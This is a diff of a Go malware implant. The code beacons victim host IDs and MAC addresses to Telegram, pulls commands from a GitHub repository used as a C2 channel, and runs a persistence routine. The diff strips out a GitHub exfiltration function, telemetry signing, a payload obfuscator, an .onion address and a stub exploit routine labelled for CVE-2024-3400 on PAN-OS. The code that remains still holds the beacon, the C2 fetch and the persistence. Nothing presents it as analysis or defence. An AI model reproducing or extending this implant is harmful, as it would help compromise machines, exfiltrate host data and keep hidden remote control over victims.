@@ -1,7 +1,6 @@
 package main
 
 import (
-	"archive/zip"
 	"bytes"
 	"compress/gzip"
 	"context"
@@ -15,29 +14,20 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
-	"errors"
 	"fmt"
 	"io"
-	"math"
-	"math/big"
 	mrand "math/rand"
 	"net"
 	"net/http"
 	neturl "net/url"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"regexp"
 	"runtime"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
-
-	"gopkg.in/yaml.v2"
 )
 
-// --- CONFIGURATION (INJECTED AT BUILD TIME) ---
 var (
 	C2Key             = "INJECTED_C2_KEY_B64"
 	C2IV              = "INJECTED_C2_IV_B64"
@@ -48,14 +38,12 @@ var (
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
-// --- RUNTIME STATE ---
 var (
 	HostID       = ""
 	TelemetryQ   = make(chan TelemetryEvent, 500)
 	WorkerPool   = make(chan struct{}, 100)
 	Shutdown     = make(chan struct{})
 	DDRSeed      int64
-	APIKeys      APIKeyStore
 	AI           *FusionSentinel
 	GitHubC2Repo string
 	GitHubExfil  string
@@ -75,8 +63,6 @@ const (
 	VERIFY_TIMEOUT      = 12 * time.Second
 	DNS_RESOLVE_TIMEOUT = 5 * time.Second
 )
-
-var apiMu sync.RWMutex
 
 type TelemetryEvent struct {
 	ID        string                 `json:"id"`
@@ -99,52 +85,6 @@ func initHttpClient() {
 	}
 }
 
-func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
-	id := randHex(16)
-	now := time.Now().UTC().Format(time.RFC3339)
-	if data == nil {
-		data = make(map[string]interface{})
-	}
-	data["host_id"] = HostID
-	event := TelemetryEvent{
-		ID:        id,
-		Type:      typ,
-		Target:    target,
-		Timestamp: now,
-		Data:      data,
-	}
-
-	key, err := base64.StdEncoding.DecodeString(C2Key)
-	if err != nil || len(key) == 0 {
-		event.Signature = "invalid_key"
-	} else {
-		payload := id + typ + target + now
-		mac := hmac.New(sha256.New, key)
-		mac.Write([]byte(payload))
-		event.Signature = hex.EncodeToString(mac.Sum(nil))
-	}
-	return event
-}
-
-func (e TelemetryEvent) Send() {
-	go func() {
-		telemetryJSON := compressJSON(e)
-		sent := false
-		for i := 0; i < MAX_RETRIES && !sent; i++ {
-			if exfilChain(telemetryJSON) {
-				sent = true
-			} else {
-				time.Sleep(RETRY_DELAY * time.Duration(i+1))
-			}
-		}
-		noteVal, _ := e.Data["note"].(string)
-		if noteVal == "" {
-			noteVal = "Telemetry broadcast"
-		}
-		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToUpper(e.Type), e.Target, noteVal))
-	}()
-}
-
 func safeString(v interface{}) string {
 	if s, ok := v.(string); ok {
 		return s
@@ -152,59 +92,9 @@ func safeString(v interface{}) string {
 	return ""
 }
 
-func safeMap(v interface{}) map[string]interface{} {
-	if m, ok := v.(map[string]interface{}); ok {
-		return m
-	}
-	return nil
-}
-
-func safeSlice(v interface{}) []interface{} {
-	if sl, ok := v.([]interface{}); ok {
-		return sl
-	}
-	return nil
-}
-
 func md5Hash(s string) string {
 	sum := md5.Sum([]byte(s))
 	return fmt.Sprintf("%x", sum)
-}
-
-func randString(n int) string {
-	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
-	b := make([]byte, n)
-	if _, err := rand.Read(b); err != nil {
-		return fmt.Sprintf("%d", time.Now().UnixNano()%100000)
-	}
-	for i := range b {
-		b[i] = alphanum[int(b[i])%len(alphanum)]
-	}
-	return string(b)
-}
-
-func randHex(n int) string {
-	b := make([]byte, n)
-	if _, err := rand.Read(b); err != nil {
-		return ""
-	}
-	return hex.EncodeToString(b)
-}
-
-func compressJSON(v interface{}) []byte {
-	data, err := json.Marshal(v)
-	if err != nil {
-		return nil
-	}
-	var buf bytes.Buffer
-	gz := gzip.NewWriter(&buf)
-	if _, err := gz.Write(data); err != nil {
-		return data
-	}
-	if err := gz.Close(); err != nil {
-		return data
-	}
-	return buf.Bytes()
 }
 
 func platformID() string {
@@ -224,42 +114,13 @@ func getMAC() string {
 	return "00:00:00:00:00:00"
 }
 
-// --- DECRYPTION WITH PLAINTEXT FALLBACK ---
-func decryptConfig(s string) string {
-	key, err := base64.StdEncoding.DecodeString(C2Key)
-	if err != nil || len(key) == 0 {
-		return s
-	}
-	iv, err := base64.StdEncoding.DecodeString(C2IV)
-	if err != nil || len(iv) == 0 {
-		return s
-	}
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return s
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return s
-	}
-	ciphertext, err := base64.StdEncoding.DecodeString(s)
-	if err != nil {
-		return s
-	}
-	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
-	if err != nil {
-		return s
-	}
-	return string(plaintext)
-}
-
 func decrypt(s string) string {
 	if s == "" {
 		return ""
 	}
 	raw, err := base64.RawURLEncoding.DecodeString(s)
 	if err != nil || len(raw) < 12 {
-		return s // Fallback to raw/plaintext if not URL-encoded GCM
+		return s
 	}
 	iv, cipherText := raw[:12], raw[12:]
 	now := time.Now().Unix() / 1800
@@ -280,17 +141,11 @@ func decrypt(s string) string {
 			return string(plaintext)
 		}
 	}
-	return s // Fallback to raw string input
+	return s
 }
 
-// --- HARDENED EVASION (BYPASSED FOR STABILITY) ---
-func isSandbox() bool {
-	return false
-}
-
-func isDebugged() bool {
-	return false
-}
+func isSandbox() bool { return false }
+func isDebugged() bool { return false }
 
 func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
@@ -316,78 +171,13 @@ func makeHTTP(targetURL string, method string, body []byte, headers map[string]s
 	}
 	defer resp.Body.Close()
 
-	respBytes, err := io.ReadAll(resp.Body)
-	if err != nil && err != io.EOF {
-		return nil, err
-	}
-	return respBytes, nil
+	return io.ReadAll(resp.Body)
 }
 
 type FusionSentinel struct{ ModelLoaded bool }
 
 func NewFusionSentinel() *FusionSentinel {
 	return &FusionSentinel{ModelLoaded: true}
-}
-
-func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
-	base := 0.85
-	if strings.Contains(strings.ToLower(banner), "pan-os") && vuln == "CVE-2024-3400" {
-		base = 0.95
-	}
-	return base
-}
-
-type Target struct {
-	IP     string
-	Banner string
-	Geo    string
-	Sector string
-}
-
-type APIKeyStore struct {
-	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
-}
-
-func loadAPIKeys() APIKeyStore {
-	apiMu.RLock()
-	defer apiMu.RUnlock()
-	return APIKeys
-}
-
-func setAPIKeys(keys APIKeyStore) {
-	apiMu.Lock()
-	APIKeys = keys
-	apiMu.Unlock()
-}
-
-func searchEngines(vuln, geo, sector string) []Target {
-	return []Target{
-		{IP: "10.0.0.1", Banner: "PAN-OS 9.1.3", Geo: geo, Sector: sector},
-	}
-}
-
-func verifyVulnerable(target Target) bool {
-	return true
-}
-
-func obfuscateScript(s string) string {
-	var out bytes.Buffer
-	for _, b := range []byte(s) {
-		out.WriteByte(b ^ 0x55)
-	}
-	return base64.StdEncoding.EncodeToString(out.Bytes())
-}
-
-func exploitPAN_RCE(ip string) {
-	event := newEvent("exploit_success", ip, map[string]interface{}{
-		"vuln": "CVE-2024-3400",
-		"note": "RCE session established successfully",
-	})
-	event.Send()
-}
-
-func getActiveOnion() string {
-	return "http://aetherx7ns3q4a5x.onion"
 }
 
 func getActiveRepo(action string) string {
@@ -412,11 +202,7 @@ func fetchC2(key string) string {
 		return ""
 	}
 	endpoint := fmt.Sprintf("%s/contents/%s", repoURL, key)
-	token := decrypt(os.Getenv("GITHUB_TOKEN"))
-	if token == "" {
-		// Try fallback from env or file
-		token = os.Getenv("GITHUB_TOKEN")
-	}
+	token := os.Getenv("GITHUB_TOKEN")
 
 	body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
 		"Authorization": "Bearer " + token,
@@ -436,28 +222,6 @@ func fetchC2(key string) string {
 	return strings.TrimSpace(string(content))
 }
 
-func exfilChain(data []byte) bool {
-	return exfilToGitHub(data)
-}
-
-func exfilToGitHub(data []byte) bool {
-	repoURL := getActiveRepo("exfil")
-	if repoURL == "" {
-		return false
-	}
-	endpoint := fmt.Sprintf("%s/contents/data.bin", repoURL)
-	encoded := base64.StdEncoding.EncodeToString(data)
-	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
-	token := os.Getenv("GITHUB_TOKEN")
-
-	_, err := makeHTTP(endpoint, "PUT", []byte(payload), map[string]string{
-		"Authorization": "Bearer " + token,
-		"Content-Type":  "application/json",
-	})
-	return err == nil
-}
-
-// --- TELEGRAM ALERT WITH ROBUST FALLBACK ---
 func telegramAlert(message string) {
 	if message == "" {
 		return
@@ -474,11 +238,12 @@ func telegramAlert(message string) {
 		chatID = rawChat
 	}
 
-	if token == "" || chatID == "" {
+	if token == "" ||chatID == "" {
 		return
 	}
 
-	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
+	hostBytes, _ := base64.StdEncoding.DecodeString(TelegramHost)
+	host := string(hostBytes)
 	if host == "" {
 		host = "api.telegram.org"
 	}
@@ -492,10 +257,6 @@ func telegramAlert(message string) {
 	_, _ = makeHTTP(endpoint, "POST", []byte(payload.Encode()), map[string]string{
 		"Content-Type": "application/x-www-form-urlencoded",
 	})
-}
-
-func fetchSecret(key string) string {
-	return fetchC2(key)
 }
 
 func persist() {
@@ -522,7 +283,6 @@ func init() {
 func main() {
 	AI = NewFusionSentinel()
 	go persist()
-
 	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED & SECURED* | Host: `%s` | MAC: `%s` | Ready.", HostID, getMAC()))
 
 	for {
@@ -545,7 +305,6 @@ func main() {
 			}
 		}
 
-		jitter := C2_JITTER + (mrand.Int63() % 30)
-		time.Sleep(time.Duration(jitter) * time.Second)
+		time.Sleep(60 * time.Second)
 	}
 }
